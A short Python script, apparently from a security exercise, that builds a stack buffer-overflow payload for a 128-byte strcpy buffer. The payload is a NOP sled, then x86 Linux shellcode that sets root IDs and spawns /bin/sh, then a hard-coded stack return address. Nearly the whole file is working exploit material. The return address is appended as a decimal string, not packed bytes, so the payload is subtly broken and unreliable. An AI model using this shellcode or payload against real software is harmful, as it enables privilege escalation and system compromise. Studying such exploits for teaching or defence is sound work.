#!/usr/bin/env python

# NOP slide: https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/

# package := NOP*padding + shellcode + sp = bufferSize

arg = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASPTR"
sp = 0xffffd640
bufferLength = 128
#shellcode = "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"
shellcode = "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"


testPackage = ""
for i in range(bufferLength+4):
    testPackage += str(i%10)

testPackage += "AAAA"

print(f'testPackage: {testPackage}')

# Actual package with shellcode
paddingLength = bufferLength + 4 - len(shellcode)


package = "\x90"*paddingLength + shellcode + str(sp)
print(f'package: {package}')
